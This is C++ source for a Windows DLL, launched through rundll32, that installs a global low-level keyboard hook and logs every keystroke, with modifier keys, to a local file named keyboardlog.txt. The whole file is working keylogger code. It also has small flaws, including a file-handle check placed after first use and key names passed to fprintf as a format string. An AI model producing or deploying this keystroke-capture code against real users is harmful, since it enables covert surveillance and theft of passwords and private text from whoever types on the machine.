#include <windows.h>
#include <iostream>

#pragma comment(lib, "User32.lib")

int pcmon_main();

// Use extern "C" to prevent C++ name mangling
extern "C" {
    // __declspec(dllexport) tells the compiler to expose this function outside the DLL
    __declspec(dllexport) void CALLBACK LaunchApp(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
        // Place your original main() logic here
        MessageBoxA(hwnd, "DLL successfully launched via rundll32!", "Success", MB_OK);
        
        // If you passed arguments in the command line, they are available in lpszCmdLine
        if (lpszCmdLine && strlen(lpszCmdLine) > 0) {
            MessageBoxA(hwnd, lpszCmdLine, "Arguments Passed", MB_OK);
        }

        pcmon_main();
    }
}

// Optional: Standard DllMain entry point for initialization
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}


FILE *fptr;
// Handle to the hook
HHOOK hhkLowLevelKybd = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		// Intercept Key Down events
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

			KBDLLHOOKSTRUCT *pKbdStruct = (KBDLLHOOKSTRUCT *) lParam;

			DWORD vkCode = pKbdStruct->vkCode;
			DWORD scanCode = pKbdStruct->scanCode;

			LONG lKeyNameParam = 0;
			lKeyNameParam |= (scanCode << 16);
			if (pKbdStruct->flags & LLKHF_EXTENDED) {
				lKeyNameParam |= (1 << 24);
			}


			char keyName[128] = { 0 };
			// Get Key Name (e.g., "Left Shift", "A", "Space")
			if (GetKeyNameTextA(lKeyNameParam, keyName, sizeof(keyName)) > 0) {

				bool shiftDown = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
				bool ctrlDown = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
				bool altDown = (GetKeyState(VK_MENU) & 0x8000) != 0;

				if (shiftDown)
				{
					fprintf(fptr, "s");
				}

				if (ctrlDown) {
					fprintf(fptr, "c");
				}

				if (altDown) {
					fprintf(fptr, "a");
				}

				fprintf(fptr, keyName);
				fprintf(fptr, ".");
			}

		}
	}

	return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
}

int pcmon_main() {
	fptr = fopen("keyboardlog.txt", "a");
	setvbuf(fptr, NULL, _IONBF, 0);

	if (fptr == NULL) {
		printf("Error opening file!\n");
		return 1;
	}

	hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

	if (hhkLowLevelKybd == NULL) {
		std::cerr << "Failed to install hook!" << std::endl;
		return 1;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	fclose(fptr);

	UnhookWindowsHookEx(hhkLowLevelKybd);
	return 0;
}